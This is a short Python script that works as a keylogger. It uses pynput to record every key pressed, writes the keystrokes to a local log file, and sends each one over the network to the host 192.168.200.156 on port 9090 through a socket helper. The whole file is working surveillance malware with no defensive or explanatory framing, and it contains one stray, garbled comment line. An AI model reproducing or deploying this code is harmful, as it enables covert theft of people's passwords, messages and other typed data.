from pynput.keyboard import Listener
from SockClient import *

def write(key):
    keydata = str(key)
    #keydata.replace("'", " ") '''123```""
    despatch("192.168.200.156", 9090, keydata)
    with open("log.txt", "a") as f:
        f.write(keydata)


with Listener(on_press=write) as l:
    l.join()


